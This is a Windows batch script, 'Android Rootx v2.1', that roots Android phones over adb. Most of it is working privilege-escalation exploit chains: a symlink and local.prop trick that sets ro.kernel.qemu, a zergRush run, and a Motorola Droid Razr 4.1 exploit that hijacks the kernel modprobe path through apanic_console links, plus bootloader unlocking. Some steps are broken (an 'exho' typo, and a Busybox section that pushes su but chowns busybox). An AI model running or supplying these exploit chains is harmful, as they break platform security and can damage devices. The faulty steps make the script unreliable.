@title Android Rootx v2.1 [By PROTOX 109]
@icon sym_root_squ_x_1-plain.png
:Begin
cls
@echo +==============================================================================+
@echo                          Android Rootx  2.1 (rev 2)
@echo                           PROTOX 109 - XDA Member
@echo.
@echo +==============================================================================+
@echo   There should be no risk of permanent damage to your device,
@echo   but by running this script, you are fully responsible for any changes made.
@echo.
@echo                      Instructions: 
@echo                      1) Plug your phone via USB Cable
@echo                      2) turn on your device
@echo                      3) allow unsigned programs
@echo                      4) enable USB debugging and Choose an option.
@echo                      5) Choose an Option Below
@echo                      6) Type it in and hit enter Twice :)
@echo.
@echo +------------------------------------------------------------------------------+
@echo.
@echo Press the number accordling to the give list below
@echo OPTIONS :-
@echo 1) Install Root
@echo 2) Install Busy Box Parts
@echo 3) Unroot Your Device
@echo 4) Unlock Boot Loader ( Chinese Tablets )[ May not work always ]
@echo 5) Exit

set /p op=Type option:
if "%op%"=="1" goto Root
if "%op%"=="2" goto Busybox
if "%op%"=="3" goto unroot
if "%op%"=="4" goto boot
if "%op%"=="5" goto exit

:Root
cls
@echo Press the option needed
@echo 1) Root For China Tablets
@echo 2) Root Using zergRUSH
@echo 3) Root For Motorola Razr ( Blade Only )

set /p op=Type option:
if "%op%"=="1" goto Root1
if "%op%"=="2" goto zerg
if "%op%"=="3" goto razr

:Root1
cls
@echo Press Enter only if you are sure to continue with this Step :-
@pause > nul
echo off
cls
files\adb shell mv /data/local/tmp /data/local/tmp.bak
files\adb shell ln -s /data /data/local/tmp
pause Step: 1/3 Wait until reboot is fully complete and then press any key...
files\adb shell rm /data/local.prop > nul
files\adb shell "echo \"ro.kernel.qemu=1\" > /data/local.prop"
pause Step: 2/3 Wait until reboot is fully complete and then press any key...
files\adb shell id
pause Step: 3/3 Wait until reboot is fully complete and then press any key...
echo Adding Root Binaries and Chowning
files\adb remount
files\adb push files\su /system/xbin/su
files\adb shell chown 0.0 /system/xbin/su
files\adb shell chmod 06755 /system/xbin/su
echo Removing changes except ROOT...
files\adb shell rm /data/local.prop
files\adb shell rm /data/local/tmp
files\adb shell mv /data/local/tmp.bak /data/local/tmp
echo Installing superuser...
files\adb push files\superuser.apk /system/app/superuser.apk
pause Done! Press any key to Go to the main menu,add Busybox, Reboot and have fun with your rooted device!
GOTO Begin

:Busybox
cls
@pause > nul
exho off
cls
files\adb devices
pause Press any key to continue.......
files\adb shell mv /data/local/tmp /data/local/tmp.bak
files\adb shell ln -s /data /data/local/tmp
pause  Press any key......
files\adb shell rm /data/local.prop > nul
files\adb shell "echo \"ro.kernel.qemu=1\" > /data/local.prop"
pause Press any key...
echo Adding BusyBox Binary and Chowning
files\adb remount
files\adb push files\su /system/xbin
files\adb shell chown 0.0 /system/xbin/busybox
files\adb shell chmod 755 /system/xbin/busybox
echo Removing Extra Tid-bits....
files\adb shell rm /data/local.prop
files\adb shell rm /data/local/tmp
files\adb shell mv /data/local/tmp.bak /data/local/tmp
pause Done!Press any key to Go to the main menu,Reboot and have fun with your rooted device!
GOTO begin

:unroot
cls
@pause > nul
echo off
cls
files\adb devices
pause press key to continue......
files\adb shell rm /system/app/superuser.apk
files\adb shell rm /system/app/Superuser.apk
files\adb shell rm /system/app/superUser.apk
files\adb shell rm /system/app/SuperUser.apk
files\adb shell rm /system/app/su.apk
files\adb shell rm /system/app/SU.apk
files\adb shell rm /system/app/Su.apk
files\adb shell rm /system/app/superSU.apk
files\adb shell rm /system/app/superSu.apk
files\adb shell rm /system/app/SuperSu.apk
files\adb shell rm /system/app/SuperSU.apk
files\adb shell rm /system/app/supersu.apk
files\adb shell rm /system/app/Root.apk
files\adb shell rm /system/xbin/su
files\adb shell rm /system/xbin/busybox
files\adb reboot
@echo It showed a number of errors but it is ok as it is a trial and error procedure. Press 'ENTER' to continue...
pause Your device is unrooted. Click enter to go back to the main menu....
goto Begin

:boot
cls
@echo Choose your option
@echo 1) Reboot to Bootloader ( some devices may not work )
@echo 2) Unlock device ( first boot to bootlaoder )
@echo 3) Go to Main Menu

set /p op=Type option:
if "%op%"=="1" goto reload
if "%op%"=="2" goto booter
if "%op%"=="3" goto Begin

:reload
@pause > nul
echo off
cls
files\adb devices
files\adb reboot bootloader
pause
@echo now you can use the second option of boot unlocking
goto boot

:booter
@pause > nul
echo off
cls
files\fastboot devices
files\fastboot oem unlock
files\fastboot reboot
pause
@echo Now Your device is boot unlocked (maybe as posted above).
@echo Just relax and wait until your device has fully booted up
@echo After that You can try to root it via option 1
@echo Thanxx For using this tool
pause
goto boot

:razr
cls
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::
::  Motorola Droid Razr Jelly Bean root exploit
::  Windows version
::
::
::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::
:: Instructions:
::
::  1. Ensure you have the latest drivers installed from Motorola
::
::  2. Put your device in debugging mode
::
::  3. Attach it via USB
::
::  4. Run this script in the same directory as the rest of the extracted
::     zipfile
::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

@echo off
cd "%~dp0"

echo [*]    Rootx Razr Blade Exploit    [*]
echo [*] Razr Blade: Motorola Droid Razr 4.1 Root Exploit (Windows version)
echo [*] Patented by Protox 109 [*]
echo [*] Thanks to djrbliss for assistance in testing.
echo [*]
echo [*] Note: this will not work on Razr HD, Razr M, etc.
echo [*]
echo [*] Before continuing, ensure USB debugging is enabled, that you
echo [*] have the latest Motorola drivers installed, and that your phone
echo [*] is connected via USB.
echo [*]
echo [*] Please carefully follow any instructions provided in the exploit.
echo [*]
echo [*] Press enter to root your phone...
pause
echo [*] 

files\adb kill-server

echo [*] Waiting for device...
files\adb wait-for-device

echo [*] Device found.
echo [*] Phase one...

files\adb shell "rm /data/dontpanic/apanic_console 2>/dev/null"
files\adb shell "ln /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar /data/dontpanic/apanic_console" 

echo [*] Rebooting device...
files\adb reboot
echo [*] Waiting for phone to reboot.
files\adb wait-for-device

echo [*] Phase two...
files\adb shell "cat /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar > /data/local/tmp/DataClearJarDex.jar.bak"

echo [*] Complete the following steps on your device:
echo [*] 1. Open the Smart Actions application.
echo [*] 2. Select "Get Started".
echo [*] 3. Select "Battery Saver".
echo [*] 4. Select "Save".
echo [*] 5. Press the Home button.
echo [*]
echo [*] Press enter here once you have completed the above steps.
pause
files\adb shell "sleep 5"
files\adb push pwn.jar /data/local/tmp/pwn.jar
files\adb shell "cat /data/local/tmp/pwn.jar > /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar"

echo [*] Rebooting device...
files\adb reboot
echo [*] Waiting for phone to reboot.
files\adb wait-for-device

echo [*] Phase three (this will take a minute)...
files\adb shell "sleep 40"

files\adb shell "mv /data/logger /data/logger.bak"
files\adb shell "mkdir /data/logger"
files\adb shell "chmod 777 /data/logger"
files\adb shell "rm /data/logger/last_apanic_console 2>/dev/null"
files\adb shell "ln -s /proc/sys/kernel/modprobe /data/logger/last_apanic_console"
files\adb shell "rm /data/dontpanic/apanic_console 2>/dev/null"
files\adb shell "echo /data/local/tmp/pwn > /data/dontpanic/apanic_console"

echo [*] Rebooting device...
files\adb reboot
echo [*] Waiting for phone to reboot.
files\adb wait-for-device

echo [*] Phase four...
files\adb push su /data/local/tmp
files\adb push busybox /data/local/tmp
files\adb push Superuser.apk /data/local/tmp
files\adb push pwn /data/local/tmp

files\adb shell "chmod 755 /data/local/tmp/pwn"
files\adb shell "/data/local/tmp/pwn trigger"

echo [*] Cleaning up...
files\adb shell "rm /data/dontpanic/* 2>/dev/null"
files\adb shell "rm /data/local/tmp/su 2>/dev/null"
files\adb shell "rm /data/local/tmp/Superuser.apk 2>/dev/null"
files\adb shell "rm /data/local/tmp/busybox 2>/dev/null"
files\adb shell "rm /data/local/tmp/pwn 2>/dev/null"
files\adb shell "su -c 'rm -r /data/logger' 2>/dev/null"
files\adb shell "su -c 'mv /data/logger.bak /data/logger'"
files\adb shell "cat /data/local/tmp/DataClearJarDex.jar.bak > /data/data/com.motorola.contextual.fw/files/DataClearJarDex.jar"
files\adb shell "rm /data/local/tmp/pwn.jar 2>/dev/null"
files\adb shell "rm /data/local/tmp/DataClearJarDex.jar.bak 2>/dev/null"

echo [*] Rebooting...
 files\adb reboot
 files\adb wait-for-device

echo [*] Exploit complete!
echo [*] Press any key to exit.
pause
files\adb kill-server

pause
goto Begin

:zerg
cls
@echo ----------------------------------------------------------
@echo	             ROOTx Root Method 2 !!!
@echo                    
@echo                 using exploit zergRush 
@echo ----------------------------------------------------------
@echo  [*] This script will:
@echo      (1) root ur device using latest zergRush exploit
@echo      (4) some checks for free space, tmp directory 
@echo          (will remove Google Maps if required)
@echo  [*] Before u begin:   
@echo      (1) make sure u have installed adb drivers for ur device
@echo      (2) enable "USB DEBUGGING" 
@echo            from (Menu\Settings\Applications\Development)
@echo      (3) enable "UNKNOWN SOURCES"
@echo            from (Menu\Settings\Applications)
@echo      (4) [OPTIONAL] increase screen timeout to 10 minutes
@echo      (5) connect USB cable to PHONE and then connect to PC
@echo      (6) skip "PC Companion Software" prompt on device
@echo ----------------------------------------------------------
@echo  CONFIRM ALL THE ABOVE THEN 
@pause
@echo --- STARTING ----
@echo --- WAITING FOR DEVICE
@files\adb wait-for-device
@echo --- creating temporary directory
@files\adb shell "cd /data/local && mkdir tmp"
@echo --- cleaning
@files\adb shell "cd /data/local/tmp/ && rm *"
@echo --- pushing zergRush
@files\adb push files\zergRush /data/local/tmp/.
@echo --- correcting permissions
@files\adb shell "chmod 777 /data/local/tmp/zergRush"
@echo --- executing zergRush
@files\adb shell "./data/local/tmp/zergRush"
@echo --- WAITING FOR DEVICE TO RECONNECT
@echo if it gets stuck over here for a long time then try:
@echo    disconnect usb cable and reconnect it
@echo    toggle "USB DEBUGGING" (first disable it then enable it)
@files\adb wait-for-device
@echo --- DEVICE FOUND
@echo --- pushing busybox
@files\adb push files\busybox /data/local/tmp/.
@echo --- correcting permissions
@files\adb shell "chmod 755 /data/local/tmp/busybox"
@echo --- remounting /system
@files\adb shell "/data/local/tmp/busybox mount -o remount,rw /system"
@echo --- checking free space on /system
@files\adb push files\makespace /data/local/tmp/.
@files\adb shell "chmod 777 /data/local/tmp/makespace"
@files\adb shell "./data/local/tmp/makespace"
@echo --- copying busybox to /system/xbin/
@files\adb shell "dd if=/data/local/tmp/busybox of=/system/xbin/busybox"
@echo --- correcting ownership
@files\adb shell "chown root.shell /system/xbin/busybox"
@echo --- correcting permissions
@files\adb shell "chmod 04755 /system/xbin/busybox"
@echo --- installing busybox
@files\adb shell "/system/xbin/busybox --install -s /system/xbin"
@files\adb shell "rm -r /data/local/tmp/busybox"
@echo --- pushing SU binary
@files\adb push files\su /system/bin/su
@echo --- correcting ownership
@files\adb shell "chown root.shell /system/bin/su"
@echo --- correcting permissions
@files\adb shell "chmod 06755 /system/bin/su"
@echo --- correcting symlinks
@files\adb shell "rm /system/xbin/su"
@files\adb shell "ln -s /system/bin/su /system/xbin/su"
@echo --- pushing Superuser app
@files\adb push files\Superuser.apk /system/app/.
@echo --- cleaning
@files\adb shell "cd /data/local/tmp/; rm *"
@echo --- rebooting
@files\adb reboot
@echo ALL DONE!!!
@pause
goto Begin

:exit
@exit

echo on
